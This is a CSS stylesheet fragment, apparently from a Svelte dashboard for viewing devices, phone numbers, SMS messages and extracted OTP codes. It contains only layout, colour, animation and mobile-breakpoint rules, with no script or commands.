  .disc-search:focus { border-color: rgba(56,189,248,0.4); }
  .disc-search::placeholder { color: #475569; }
  .disc-sort {
    padding: 7px 10px; font-size: 11px; background: rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.08); border-radius: 7px;
    color: #e2e8f0; font-family: inherit; cursor: pointer; outline: none;
  }
  .disc-refresh {
    width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
    background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08);
    border-radius: 7px; color: #94a3b8; font-size: 16px; cursor: pointer;
    transition: all 0.15s;
  }
  .disc-refresh:hover { background: rgba(56,189,248,0.1); color: #38bdf8; }
  .disc-empty {
    text-align: center; padding: 40px 16px; color: #475569; font-size: 13px;
  }
  .disc-empty a { color: #38bdf8; text-decoration: none; }
  .disc-empty a:hover { text-decoration: underline; }
  .disc-list { display: flex; flex-direction: column; gap: 4px; }
  .disc-row {
    background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.04);
    border-radius: 8px; padding: 8px 12px; transition: border-color 0.15s;
  }
  .disc-row:hover { border-color: rgba(56,189,248,0.15); }
  .disc-row-top { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; flex-wrap: wrap; }
  .disc-devid {
    font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #7dd3fc;
    background: none; border: none; cursor: pointer; padding: 0; text-align: left;
    word-break: break-all;
  }
  .disc-devid:hover { color: #38bdf8; text-decoration: underline; }
  .disc-arrow { color: #475569; font-size: 12px; flex-shrink: 0; }
  .disc-phone {
    font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #34d399;
    font-weight: 600; background: none; border: none; cursor: pointer; padding: 0;
  }
  .disc-phone:hover { color: #22c55e; text-decoration: underline; }
  .disc-row-meta { display: flex; align-items: center; gap: 8px; font-size: 10px; color: #475569; flex-wrap: wrap; }
  .disc-conn { color: #64748b; font-weight: 500; }
  .disc-method {
    font-size: 9px; font-weight: 600; padding: 1px 6px; border-radius: 4px;
    text-transform: uppercase; letter-spacing: 0.04em;
  }
  .disc-method-sms { background: rgba(56,189,248,0.1); color: #38bdf8; }
  .disc-method-manual { background: rgba(251,191,36,0.1); color: #fbbf24; }
  .disc-attempts { color: #64748b; font-family: 'JetBrains Mono', monospace; }
  .disc-date { color: #475569; margin-left: auto; white-space: nowrap; }

  .send-wrap {
    max-width: 560px;
  }
  .send-hdr {
    font-size: 22px;
    font-weight: 800;
  }
  .send-sub {
    font-size: 12px;
    color: #64748b;
    margin-top: 4px;
  }
  .send-form {
    display: flex;
    flex-direction: column;
    gap: 14px;
    margin-top: 16px;
  }
  .field {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }
  .field label {
    font-size: 12px;
    font-weight: 600;
    color: #94a3b8;
  }

  /* SHARED */
  input,
  textarea {
    background: #0d1117;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 7px;
    padding: 8px 10px;
    color: #e2e8f0;
    font-size: 13px;
    font-family: inherit;
    outline: none;
    width: 100%;
    transition: border-color 130ms;
  }
  input:focus,
  textarea:focus {
    border-color: rgba(249, 115, 22, 0.5);
  }
  textarea {
    resize: vertical;
  }
  .code {
    font-family: "JetBrains Mono", monospace;
    font-size: 12px;
  }
  .json-view {
    font-family: "JetBrains Mono", monospace;
    font-size: 11px;
    color: #94a3b8;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 200px;
    overflow-y: auto;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 6px;
    padding: 8px;
    margin: 0;
  }
  .mono {
    font-family: "JetBrains Mono", monospace;
  }
  .btn {
    padding: 8px 16px;
    border-radius: 7px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    border: none;
    font-family: inherit;
    transition: all 140ms;
  }
  .btn-primary {
    background: #f97316;
    color: #fff;
    box-shadow: 0 3px 12px rgba(249, 115, 22, 0.3);
  }
  .btn-primary:hover:not(:disabled) {
    background: #ea6c0a;
  }
  .btn-ghost {
    background: rgba(255, 255, 255, 0.06);
    color: #94a3b8;
    border: 1px solid rgba(255, 255, 255, 0.1);
  }
  .btn-ghost:hover {
    background: rgba(255, 255, 255, 0.1);
    color: #e2e8f0;
  }
  .btn-sm {
    padding: 5px 12px;
    font-size: 12px;
  }

  .spin-ring {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 255, 255, 0.2);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }

  /* TOASTS */
  .toast-stack {
    position: fixed;
    bottom: 22px;
    right: 22px;
    z-index: 999;
    display: flex;
    flex-direction: column;
    gap: 8px;
    pointer-events: none;
  }
  .toast {
    background: #1a2232;
    border: 1px solid rgba(249, 115, 22, 0.3);
    border-radius: 8px;
    padding: 10px 14px;
    font-size: 13px;
    color: #e2e8f0;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.7);
    animation: toast-in 0.2s ease both;
    min-width: 180px;
    max-width: 300px;
  }
  .toast.out {
    animation: toast-out 0.3s ease forwards;
  }
  .toast.success {
    border-color: rgba(34, 197, 94, 0.4);
    color: #22c55e;
  }
  .toast.error {
    border-color: rgba(239, 68, 68, 0.4);
    color: #ef4444;
  }
  .toast.info {
    border-color: rgba(56, 189, 248, 0.3);
    color: #38bdf8;
  }

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
  @keyframes toast-in {
    from {
      opacity: 0;
      transform: translateY(8px);
    }
    to {
      opacity: 1;
      transform: none;
    }
  }
  @keyframes toast-out {
    from {
      opacity: 1;
    }
    to {
      opacity: 0;
      transform: translateY(6px);
    }
  }

  /* ── MOBILE HAMBURGER BUTTON ─────────────────────────────────────────── */
  .mob-menu-btn {
    display: none;
    align-items: center;
    justify-content: center;
    width: 36px;
    height: 36px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.12);
    background: rgba(255, 255, 255, 0.06);
    color: #e2e8f0;
    cursor: pointer;
    flex-shrink: 0;
    transition: all 140ms;
  }
  .mob-menu-btn:hover {
    background: rgba(255, 255, 255, 0.1);
  }

  /* ── MOBILE BACKDROP ─────────────────────────────────────────────────── */
  .mob-backdrop {
    display: none;
    position: fixed;
    inset: 0;
    z-index: 110;
    background: rgba(0, 0, 0, 0.6);
    backdrop-filter: blur(2px);
  }

  /* ── BREAKPOINTS ─────────────────────────────────────────────────────── */

  /* Tablet (≤ 900px): tighten grids */
  @media (max-width: 900px) {
    .info-grid {
      grid-template-columns: 1fr 1fr;
    }
    .ap-grid {
      grid-template-columns: 1fr 1fr;
    }
  }

  /* Mobile & Tablet (≤ 768px): full responsive layout */
  @media (max-width: 768px) {
    /* Show hamburger, hide sidebar by default */
    .mob-menu-btn {
      display: flex;
    }

    /* Backdrop: shown when rendered (controlled by Svelte {#if}) */
    .mob-backdrop {
      display: block;
      z-index: 190;
    }

    /* Sidebar becomes a fixed off-canvas drawer */
    .sidebar {
      position: fixed;
      left: 0;
      top: 0;
      bottom: 0;
      height: 100vh !important;
      height: 100dvh !important;
      z-index: 200;
      transform: translateX(-100%);
      transition: transform 260ms cubic-bezier(0.4, 0, 0.2, 1);
      width: min(300px, 85vw) !important;
      box-shadow: 4px 0 30px rgba(0, 0, 0, 0.6);
      padding-bottom: 0 !important;
    }
    .sidebar.mob-open {
      transform: translateX(0);
    }
    .side-dev-list {
      padding-bottom: 28px !important;
      min-height: 0 !important;
      -webkit-overflow-scrolling: touch !important;
    }

    /* Main takes full width */
    .main {
      width: 100%;
      min-width: 0;
    }

    /* Topbar: compact mobile layout */
    .topbar {
      padding: 0 10px;
      height: 48px;
      gap: 6px;
    }
    .tb-l {
      gap: 6px;
      min-width: 0;
      flex: 1;
      overflow: hidden;
    }
    .tb-r {
      gap: 5px;
      flex-shrink: 0;
    }

    /* Hide stat text pills on mobile — already featured in overview */
    .tbstat {
      display: none;
    }

    /* Smaller touch buttons for topbar */
    .ico-btn {
      width: 34px;
      height: 34px;
    }

    /* Tab bar: scrollable */
    .tab-bar {
      overflow-x: auto;
      padding: 0 8px;
      gap: 0;
      scrollbar-width: none;
    }
    .tab-bar::-webkit-scrollbar {
      display: none;
    }
    .tab {
      padding: 10px 14px;
      font-size: 12px;
      white-space: nowrap;
      flex-shrink: 0;
    }

    /* Tab body: safe padding for bottom nav */
    .tab-body {
      padding: 12px 14px calc(75px + env(safe-area-inset-bottom, 0px));
      gap: 10px;
    }

    /* Overview tab: maintains device-only scroll fill */
    .tab-body-overview {
      padding: 8px 10px calc(70px + env(safe-area-inset-bottom, 0px)) !important;
      gap: 8px !important;
      height: 100% !important;
      min-height: 0 !important;
      overflow: hidden !important;
      display: flex !important;
      flex-direction: column !important;
    }

    /* Stat row: 4 compact columns */
    .stat-row {
      grid-template-columns: repeat(4, 1fr) !important;
      gap: 5px !important;
    }
    .stat-card {
      padding: 6px 8px !important;
    }
    .sc-n {
      font-size: 19px !important;
    }
    .sc-l {
      font-size: 8px !important;
      letter-spacing: 0.04em !important;
    }

    /* Live card: compact */
    .live-card {
      padding: 8px 12px !important;
      gap: 8px !important;
    }
    .lc-icon {
      width: 36px !important;
      height: 36px !important;
    }
    .lc-title {
      font-size: 13px !important;
    }
    .lc-sub {
      font-size: 10px !important;
    }

    /* Device card & scroll container: fills remaining vertical height */
    .dt-card {
      flex: 1 !important;
      min-height: 0 !important;
      display: flex !important;
      flex-direction: column !important;
      border-radius: 8px;
    }
    .dt-filters {
      padding: 8px 10px 6px;
      gap: 6px;
    }
    .dt-chips {
      gap: 4px;
    }
    .dt-chip {
      font-size: 10.5px;
      padding: 4px 8px;
      min-height: 32px;
    }
    .dt-scroll {
      flex: 1 !important;
      min-height: 0 !important;
      max-height: none !important;
      overflow-y: auto !important;
      overflow-x: hidden !important;
      -webkit-overflow-scrolling: touch !important;
      overscroll-behavior-y: contain;
    }

    /* Dev cards in single column on mobile */
    .dev-card-grid {
      grid-template-columns: 1fr !important;
      gap: 6px !important;
      padding: 6px !important;
    }
    .dev-card {
      padding: 9px 10px !important;
      min-height: 52px !important;
      gap: 8px !important;
      border-radius: 6px;
    }
    .dev-card-id {
      font-size: 11.5px !important;
      max-width: 140px;
    }
    .dev-card-sub {
      flex-wrap: wrap !important;
      gap: 5px !important;
      min-width: 0;
    }
    .dev-card-phone-btn {
      font-size: 11px !important;
      max-width: 140px;
    }
    .dev-card-last-sms {
      font-size: 9px !important;
    }
    .dev-card-bat {
      font-size: 9.5px !important;
      padding: 1px 4px !important;
    }

    /* Pagination bar: compact mobile */
    .pag-bar {
      padding: 8px 10px !important;
      gap: 6px !important;
      justify-content: space-between !important;
    }
    .pag-summary {
      font-size: 11px !important;
    }
    .pag-btn-txt {
      display: none !important;
    }
    .pag-btn-nav {
      padding: 0 7px !important;
    }

    /* Info grid: 2 col on tablet/phone */
    .info-grid {
      grid-template-columns: 1fr 1fr;
      gap: 8px;
    }

    /* Device card: stack vertically on mobile */
    .dv-card {
      flex-direction: column;
      align-items: flex-start;
      gap: 10px;
      padding: 12px;
    }
    .dv-bat {
      align-items: flex-start;
    }
    .dv-bat-n {
      font-size: 28px;
    }
    .dv-id {
      font-size: 15px;
    }

    /* Action buttons */
    .act-row {
      flex-direction: column;
      gap: 8px;
    }
    .act-btn {
      padding: 14px;
      font-size: 15px;
    }

    /* Add Firebase & Settings panel: scrollable on mobile */
    .add-panel {
      padding: 12px 14px 24px !important;
      max-height: calc(100vh - 110px) !important;
      max-height: calc(100dvh - 110px) !important;
      overflow-y: auto !important;
      -webkit-overflow-scrolling: touch !important;
      overscroll-behavior-y: contain;
    }
    .ap-grid {
      grid-template-columns: 1fr !important;
      gap: 8px;
    }

    /* Raw drawer: full width */
    .raw-drawer {
      max-height: 50vh !important;
      padding: 10px 12px 16px !important;
    }
    .rd-row {
      flex-wrap: wrap !important;
      gap: 6px !important;
    }
    .rd-path {
      min-width: 140px !important;
      width: 100% !important;
      order: 3;
    }

    /* Send form: full width */
    .send-wrap {
      max-width: 100%;
    }

    /* Messages topbar: wrap */
    .msg-topbar {
      gap: 6px;
      flex-wrap: wrap;
    }
    .msg-search-wrap {
      min-width: 0;
      flex: 1;
    }
    .msg-count {
      font-size: 13px;
    }

    /* Message list: touch-friendly */
    .msg-card {
      padding: 10px 12px;
    }
    .mc-otp {
      padding: 8px 10px;
    }
    .otp-code {
      font-size: 22px;
    }

    /* Toasts: bottom-center, above bottom nav */
    .toast-stack {
      right: 12px !important;
      left: 12px !important;
      bottom: calc(70px + env(safe-area-inset-bottom, 0px)) !important;
      transform: none !important;
      width: auto !important;
      max-width: 380px !important;
      margin: 0 auto;
      align-items: stretch;
    }
    .toast {
      min-width: 0;
      max-width: 100%;
      text-align: center;
    }

    /* Notifications stack: bottom of screen above bottom nav */
    .notif-stack {
      top: auto !important;
      right: 8px !important;
      left: 8px !important;
      bottom: calc(68px + env(safe-area-inset-bottom, 0px)) !important;
      width: auto !important;
      max-width: 420px !important;
      padding: 0 !important;
      max-height: 50vh !important;
      margin: 0 auto !important;
    }
    .notif-scroll {
      max-height: 44vh;
      scrollbar-width: none;
    }
    .notif {
      border-radius: 16px;
      padding: 8px 11px;
    }
    .notif-clear-all {
      border-radius: 12px;
      padding: 8px 12px;
      font-size: 11px;
    }
    .n-otp-code {
      font-size: 20px;
    }
    .n-otp-row {
      padding: 7px 11px;
    }

    /* Floating Bell notification panel */
    .bell-panel {
      position: fixed !important;
      top: 52px !important;
      left: 8px !important;
      right: 8px !important;
      width: auto !important;
      height: auto !important;
      max-width: calc(100vw - 16px) !important;
      max-height: calc(100vh - 125px) !important;
      max-height: calc(100dvh - 125px) !important;
      transform: none !important;
      z-index: 250 !important;
      border-radius: 16px !important;
    }
    .bp-resize-edge,
    .bp-resize-corner {
      display: none !important;
    }

    /* Compact sidebar controls */
    .side-search {
      margin: 6px 8px 3px;
      padding: 5px 8px;
    }
    .search-in {
      font-size: 11px;
    }
    .filt {
      font-size: 10px;
      padding: 4px 2px;
      min-height: 36px;
    }
    .dev-item {
      min-height: 48px;
    }
    .btn,
    .btn-sm {
      min-height: 40px;
    }
  }

  /* Very small (≤ 360px): extra tightening */
  @media (max-width: 360px) {
    .tab {
      padding: 9px 10px;
      font-size: 11px;
    }
    .stat-row {
      grid-template-columns: repeat(2, 1fr) !important;
      gap: 4px !important;
    }
    .sc-n {
      font-size: 18px !important;
    }
    .dev-card-id {
      max-width: 105px !important;
    }
    .dev-card-phone-btn {
      max-width: 115px !important;
    }
    .info-grid {
      grid-template-columns: 1fr;
    }
    .pag-bar {
      justify-content: center !important;
    }
    .pag-summary {
      width: 100% !important;
      text-align: center !important;
      font-size: 10px !important;
    }
    .n-otp-code {
      font-size: 20px;
    }
    .notif {
      border-radius: 14px;
    }
  }

  /* ── NOTIFICATION STACK (top-left) ───────────────────────────────────── */
  /* ── NOTIFICATION STACK — Apple glass ───────────────────────────────────── */
  /* ── NOTIFICATION STACK ─────────────────────────────────────────────────── */
  /* ══ NOTIFICATION STACK — Apple Liquid Glass ═════════════════════════════ */
  .notif-stack {
    position: fixed;
    top: 54px;
    right: 16px;
    z-index: 1000;
    display: flex;
    flex-direction: column;
    gap: 8px;
    pointer-events: none;
    width: 360px;
  }
  .notif-scroll {
    display: flex;
    flex-direction: column;
    gap: 8px;
    overflow-y: auto;
    overflow-x: hidden;
    max-height: calc(4 * 204px + 3 * 8px); /* 4 cards max */
    pointer-events: all;
    padding-right: 2px;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.08) transparent;
    user-select: none;
  }
  .notif-scroll::-webkit-scrollbar {
    width: 3px;
  }
  .notif-scroll::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
  }

  /* ── Card: Apple Liquid Glass ─────────────────────────────────────────── */
  .notif {
    pointer-events: all;
    position: relative;
    overflow: hidden;

    /* Self-sizing — no fixed min-height */
    display: flex;
    flex-direction: column;
    gap: 6px;

    /* Transparent liquid glass */
    background: linear-gradient(
        135deg,
        rgba(255, 255, 255, 0.1),
        rgba(255, 255, 255, 0.03) 45%,
        rgba(80, 130, 255, 0.05)
      ),
      rgba(11, 14, 23, 0.25);

    -webkit-backdrop-filter: blur(40px) saturate(200%) brightness(1.08);
    backdrop-filter: blur(40px) saturate(200%) brightness(1.08);

    border: 1px solid rgba(255, 255, 255, 0.1);
    border-top-color: rgba(255, 255, 255, 0.18);
    border-radius: 20px;

    box-shadow:
      0 16px 48px rgba(0, 0, 0, 0.22),
      0 3px 12px rgba(0, 0, 0, 0.12),
      inset 0 1px 0 rgba(255, 255, 255, 0.18),
      inset 0 -1px 0 rgba(255, 255, 255, 0.05);

    padding: 10px 13px 9px;
    color: #f8fafc;
    animation: notif-in 0.34s cubic-bezier(0.34, 1.4, 0.64, 1) both;
    transition:
      background 220ms ease,
      border-color 220ms ease,
      box-shadow 220ms ease,
      transform 220ms ease;
  }
  /* Reflective sheen layer */
  .notif::before {
    content: "";
    position: absolute;
    inset: 0;
    pointer-events: none;
    border-radius: inherit;
    z-index: 0;
    background: linear-gradient(
      115deg,
      rgba(255, 255, 255, 0.09) 0%,
      rgba(255, 255, 255, 0.025) 22%,
      transparent 48%,
      rgba(100, 150, 255, 0.035) 100%
    );
    opacity: 0.8;
  }
  /* All card children above sheen */

  @media (hover: hover) {
    .notif:hover {
      border-color: rgba(255, 255, 255, 0.24);
      box-shadow:
        0 24px 70px rgba(0, 0, 0, 0.42),
        inset 0 1px 0 rgba(255, 255, 255, 0.16);
      transform: translateY(-1px);
    }
  }
  .notif.nleave {
    animation: notif-out 0.25s ease forwards;
  }

  /* Fallback: no backdrop-filter */
  @supports not (
    (backdrop-filter: blur(1px)) or (-webkit-backdrop-filter: blur(1px))
  ) {
    .notif {
      background: rgba(15, 20, 38, 0.82);
    }
  }
  .n-close {
    width: 22px;
    height: 22px;
    min-width: 22px;
    min-height: 22px;
    border-radius: 50%;
    flex-shrink: 0;
    border: 1px solid rgba(255, 255, 255, 0.16);
    background: rgba(255, 255, 255, 0.08);
    color: rgba(255, 255, 255, 0.55);
    cursor: pointer;
    font-size: 14px;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0;
    line-height: 1;
    font-family: inherit;
    transition:
      background 160ms,
      transform 160ms,
      color 160ms,
      border-color 160ms;
  }
  .n-close:hover {
    background: rgba(239, 68, 68, 0.35);
    border-color: rgba(239, 68, 68, 0.5);
    color: #fff;
    transform: scale(1.08);
  }
  .n-close:active {
    transform: scale(0.92);
  }
  /* Header row */
  .n-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 6px;
    flex-shrink: 0;
  }
  .n-ids {
    display: flex;
    align-items: center;
    gap: 5px;
    min-width: 0;
    overflow: hidden;
  }
  .n-conn {
    font-size: 9px;
    font-weight: 800;
    letter-spacing: 0.07em;
    flex-shrink: 0;
  }
  .n-dev {
    font-size: 9px;
    color: rgba(255, 255, 255, 0.5);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    font-family: "JetBrains Mono", monospace;
  }
  .n-time {
    font-size: 9px;
    color: rgba(255, 255, 255, 0.45);
    font-family: "JetBrains Mono", monospace;
    flex-shrink: 0;
  }

  /* Sender + about row */
  .n-sender-row {
    display: flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
    flex-wrap: wrap;
  }
  .n-sender {
    font-size: 12.5px;
    font-weight: 700;
    color: #fff;
    letter-spacing: -0.01em;
  }
  .n-about {
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.06em;
    padding: 2px 6px;
    border-radius: 5px;
    background: rgba(249, 115, 22, 0.15);
    color: #f97316;
    border: 1px solid rgba(249, 115, 22, 0.3);
    flex-shrink: 0;
  }

  /* Message — 1-line clamp */
  .n-msg {
    font-size: 11px;
    color: rgba(255, 255, 255, 0.72);
    line-height: 1.4;
    display: -webkit-box;
    -webkit-line-clamp: 1;
    -webkit-box-orient: vertical;
    overflow: hidden;
    flex-shrink: 0;
  }

  /* OTP — compact green glass panel */
  .n-otp-row {
    position: relative;
    overflow: hidden;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 6px 11px;
    margin-top: 2px;

    background: linear-gradient(
        135deg,
        rgba(52, 211, 153, 0.13),
        rgba(16, 185, 129, 0.035)
      ),
      rgba(6, 78, 59, 0.42);
    -webkit-backdrop-filter: blur(18px) saturate(160%);
    backdrop-filter: blur(18px) saturate(160%);
    border: 1px solid rgba(52, 211, 153, 0.38);
    border-radius: 12px;

    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08);
    cursor: pointer;
    user-select: none;
    transition:
      border-color 180ms,
      box-shadow 180ms;
  }
  .n-otp-row:hover {
    border-color: rgba(52, 211, 153, 0.6);
    box-shadow:
      inset 0 1px 0 rgba(255, 255, 255, 0.1),
      0 0 14px rgba(52, 211, 153, 0.18);
  }
  .n-otp-row:active {
    transform: scale(0.98);
  }
  .n-otp-label {
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.12em;
    color: rgba(52, 211, 153, 0.65);
    flex-shrink: 0;
  }
  .n-otp-code {
    font-family: "JetBrains Mono", monospace;
    font-size: 16px;
    font-weight: 900;
    color: #4ade80;
    text-shadow: 0 0 12px rgba(74, 222, 128, 0.14);
    font-variant-numeric: tabular-nums;
    letter-spacing: 0.12em;
    flex: 1;
  }
  .n-otp-copy-ico {
    color: rgba(74, 222, 128, 0.45);
    flex-shrink: 0;
    transition: color 130ms;
  }

  /* Verification-only row (no OTP extracted) */
  .n-verif-row {
    display: flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
    padding: 5px 10px;
    border-radius: 10px;
    margin-top: 2px;
    background: rgba(56, 189, 248, 0.08);
    border: 1px solid rgba(56, 189, 248, 0.2);
  }
  .n-verif-label {
    font-size: 8px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #38bdf8;
    flex-shrink: 0;
  }
  .n-verif-text {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.7);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }

  /* Clear all */
  .notif-clear-all {
    pointer-events: all;
    width: 100%;
    padding: 10px 14px;
    border-radius: 16px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    background: rgba(15, 20, 38, 0.8);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    color: rgba(255, 255, 255, 0.38);
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: all 160ms;
    text-align: center;
    letter-spacing: 0.03em;
  }
  .notif-clear-all:hover {
    background: rgba(239, 68, 68, 0.2);
    border-color: rgba(239, 68, 68, 0.4);
    color: #fca5a5;
  }
  .notif-clear-all:active {
    transform: scale(0.98);
  }

  /* ── OTP in messages ──────────────────────────────────────────────────── */
  .mc-otp {
    display: flex;
    align-items: center;
    gap: 8px;
    margin: 4px 0;
    background: rgba(34, 197, 94, 0.07);
    border: 1px solid rgba(34, 197, 94, 0.2);
    border-radius: 7px;
    padding: 6px 10px;
    cursor: pointer;
    user-select: none;
    transition: all 140ms;
  }
  .mc-otp:hover {
    background: rgba(34, 197, 94, 0.16);
    border-color: rgba(34, 197, 94, 0.45);
    transform: scale(1.01);
  }
  .mc-otp:active {
    transform: scale(0.98);
  }
  .otp-copy-hint {
    margin-left: auto;
    color: rgba(34, 197, 94, 0.5);
    opacity: 0;
    transition: opacity 140ms;
    flex-shrink: 0;
    display: flex;
    align-items: center;
  }
  .mc-otp:hover .otp-copy-hint {
    opacity: 1;
  }
  .otp-label {
    font-size: 9px;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #64748b;
    flex-shrink: 0;
  }
  .otp-code {
    font-family: "JetBrains Mono", monospace;
    font-size: 15px;
    font-weight: 900;
    color: #22c55e;
    letter-spacing: 0.14em;
    flex: 1;
  }
  .otp-copy-btn {
    padding: 5px 12px;
    border-radius: 6px;
    border: none;
    background: #22c55e;
    color: #fff;
    font-size: 12px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    transition: all 130ms;
    flex-shrink: 0;
    white-space: nowrap;
  }
  .otp-copy-btn:hover {
    background: #16a34a;
    transform: scale(1.03);
  }

  /* ── Used / checkbox ─────────────────────────────────────────────────── */
  .mc-check {
    width: 14px;
    height: 14px;
    accent-color: #f97316;
    cursor: pointer;
    flex-shrink: 0;
  }
  .mc-used {
    opacity: 0.55;
  }
  .mc-body-used {
    text-decoration: line-through;
    color: #475569 !important;
  }
  .mc-used-tag {
    font-size: 10px;
    font-weight: 700;
    color: #22c55e;
    background: rgba(34, 197, 94, 0.12);
    border: 1px solid rgba(34, 197, 94, 0.25);
    border-radius: 4px;
    padding: 1px 6px;
    margin-left: auto;
  }

  /* ── Phone edit ──────────────────────────────────────────────────────── */
  .phone-edit-row {
    display: flex;
    gap: 5px;
    align-items: center;
  }
  .phone-edit-in {
    font-size: 12px;
    padding: 5px 8px;
    border-radius: 5px;
    flex: 1;
    min-width: 0;
  }
  .edit-ph-btn {
    background: none;
    border: none;
    font-size: 11px;
    color: #64748b;
    cursor: pointer;
    padding: 2px 5px;
    border-radius: 4px;
    font-family: inherit;
    transition: all 120ms;
  }
  .edit-ph-btn:hover {
    color: #f97316;
    background: rgba(249, 115, 22, 0.08);
  }
  .add-ph {
    color: #f97316 !important;
    border: 1px dashed rgba(249, 115, 22, 0.35) !important;
    padding: 4px 9px !important;
  }

  /* ── Device card grid (replaces table) ────────────────────────────────── */
  /* ── Device card grid (2 columns on desktop/web) ────────────────────────── */
  .dev-card-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 8px;
    padding: 8px;
    background: transparent;
  }
  @media (max-width: 600px) {
    .dev-card-grid {
      grid-template-columns: 1fr !important;
      gap: 6px !important;
      padding: 6px !important;
    }
  }
  .dev-card {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 12px;
    background: #0f1523;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition: background 100ms;
    min-height: 56px;
  }
  .dev-card:hover {
    background: #141b2d;
  }
  .dev-card-sel {
    background: rgba(249, 115, 22, 0.06) !important;
  }
  .dev-card-used {
    opacity: 0.55;
  }
  /* Used/Free badge on card */
  .dev-card-used-badge {
    font-size: 8.5px;
    font-weight: 800;
    letter-spacing: 0.05em;
    padding: 1px 5px;
    border-radius: 3px;
    flex-shrink: 0;
  }
  .dcub-used {
    background: rgba(239,68,68,0.12);
    color: #ef4444;
    border: 1px solid rgba(239,68,68,0.25);
  }
  .dcub-fresh {
    background: rgba(34,197,94,0.1);
    color: #22c55e;
    border: 1px solid rgba(34,197,94,0.2);
  }
  /* Clickable phone number */
  .dev-card-phone-btn {
    font-size: 11.5px;
    color: #38bdf8;
    font-family: "JetBrains Mono", monospace;
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    font-family: inherit;
    font-family: "JetBrains Mono", monospace;
    transition: color 120ms;
    text-decoration: underline;
    text-decoration-color: transparent;
    text-underline-offset: 2px;
  }
  .dev-card-phone-btn:hover {
    color: #7dd3fc;
    text-decoration-color: #38bdf8;
  }
  /* Last SMS time */
  .dev-card-last-sms {
    font-size: 9.5px;
    color: #475569;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .dev-card-bar {
    width: 3px;
    height: calc(100% - 14px);
    border-radius: 2px;
    flex-shrink: 0;
    position: absolute;
    left: 0;
    top: 7px;
  }
  .dev-card-dot {
    flex-shrink: 0;
    margin-left: 8px;
  }
  .dev-card-body {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .dev-card-id-row {
    display: flex;
    align-items: center;
    gap: 5px;
  }
  .dev-card-id {
    font-size: 12px;
    color: #e2e8f0;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .dev-card-sub {
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .dev-card-phone {
    font-size: 11.5px;
    color: #94a3b8;
    font-family: "JetBrains Mono", monospace;
  }
  .dev-card-no-num {
    font-size: 10.5px;
    color: #334155;
    font-style: italic;
  }
  .dev-card-sim {
    font-size: 9.5px;
    color: #475569;
    background: rgba(255, 255, 255, 0.05);
    padding: 1px 5px;
    border-radius: 3px;
  }
  .dev-card-right {
    display: flex;
    align-items: center;
    gap: 6px;
    flex-shrink: 0;
  }
  .dev-card-bat {
    font-size: 11px;
    font-weight: 700;
    padding: 2px 7px;
    border-radius: 5px;
    font-family: "JetBrains Mono", monospace;
  }
  .dev-card-arrow {
    color: #334155;
    transition: color 120ms;
  }
  .dev-card:hover .dev-card-arrow {
    color: #64748b;
  }
  .dt-empty {
    text-align: center;
    padding: 32px 16px;
    color: #334155;
    font-size: 13px;
  }
  /* Small icon-only copy button */
  .icon-btn-xs {
    width: 20px;
    height: 20px;
    border-radius: 4px;
    border: none;
    padding: 0;
    background: rgba(255, 255, 255, 0.06);
    color: rgba(255, 255, 255, 0.3);
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    transition: all 130ms;
  }
  .icon-btn-xs:hover {
    background: rgba(56, 189, 248, 0.18);
    color: #38bdf8;
  }
  .icon-btn-xs:active {
    transform: scale(0.92);
  }

  /* ── Floating Notification Panel ──────────────────────────────────────── */
  .np-panel {
    position: fixed;
    top: 12px;
    right: 12px;
    z-index: 200;
    width: min(340px, calc(100vw - 24px));
    display: flex;
    flex-direction: column;
    background: rgba(10, 14, 26, 0.82);
    -webkit-backdrop-filter: blur(32px) saturate(180%);
    backdrop-filter: blur(32px) saturate(180%);
    border: 1px solid rgba(255, 255, 255, 0.12);
    border-radius: 18px;
